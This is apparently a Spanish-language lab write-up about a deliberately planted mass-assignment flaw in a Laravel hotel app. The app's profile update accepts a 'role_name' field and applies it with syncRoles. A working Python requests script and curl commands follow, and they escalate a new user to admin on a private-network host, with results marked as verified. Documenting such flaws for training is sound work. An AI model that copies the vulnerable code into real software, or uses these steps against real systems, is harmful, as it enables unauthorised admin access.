# 03 - Mass Assignment / Escalación de Roles

**Responsable:** Bri
**Tipo:** Mass Assignment (A01:2021 - Broken Access Control)

## Archivo modificado
`app/Http/Controllers/ProfileController.php` (línea 70-72)

## Cambio realizado
Se agregó lógica que permite asignar cualquier rol de Spatie Permission desde el request de actualización de perfil:

```php
// 🔥 VULNERABLE - Agregado en update():
if ($request->has('role_name')) {
    $user->syncRoles([$request->role_name]);
}
```

Esto permite que cualquier usuario autenticado se asigne a sí mismo el rol `admin`, `gerente`, etc.

## Explotación

### Paso 1: Crear usuario nuevo (registro abierto)
```python
import requests, re

s = requests.Session()
BASE = "http://192.168.18.38:8001"

r = s.get(f"{BASE}/register")
token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)

r = s.post(f"{BASE}/register", data={
    "_token": token,
    "name": "Bri",
    "username": "bri_test",
    "email": "bri@test.com",
    "password": "Pass123456",
    "password_confirmation": "Pass123456"
}, allow_redirects=True)
```

### Paso 2: Obtener token del profile
```python
r = s.get(f"{BASE}/profile")
token2 = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
```

### Paso 3: Escalar a admin (Mass Assignment)
```python
r = s.post(f"{BASE}/profile", data={
    "_token": token2,
    "_method": "patch",
    "name": "Bri",
    "email": "bri@test.com",
    "role_name": "admin"  # ← ESTO es la vulnerabilidad
}, allow_redirects=True)
```

### Paso 4: Verificar acceso admin
```python
r = s.get(f"{BASE}/admin/dashboard")
print(r.status_code)  # → 200 (acceso concedido!)
```

## Resultado (verificado)
```
REGISTER:       HTTP 302 → /dashboard
PROFILE PATCH:  HTTP 200
ADMIN DASHBOARD: HTTP 200 ✅ ACCESO ADMIN
```

## Con curl
```bash
# Registrar
curl -s -L -X POST "http://192.168.18.38:8001/register" \
  -b cookies.txt -c cookies.txt \
  -d "_token=TOKEN&name=Bri&username=bri&email=bri@t.com&password=Pass123456&password_confirmation=Pass123456"

# Escalar
curl -s -L -X POST "http://192.168.18.38:8001/profile" \
  -b cookies.txt \
  -d "_token=TOKEN2&_method=patch&name=Bri&email=bri@t.com&role_name=admin"

# Verificar
curl -b cookies.txt "http://192.168.18.38:8001/admin/dashboard"
```

## Impacto
- Escalación de privilegios de **usuario normal → admin**
- Acceso a rutas protegidas (`/admin/*`)
- Gestión de usuarios, ventas, productos del hotel
- Potencial compromiso total del sistema
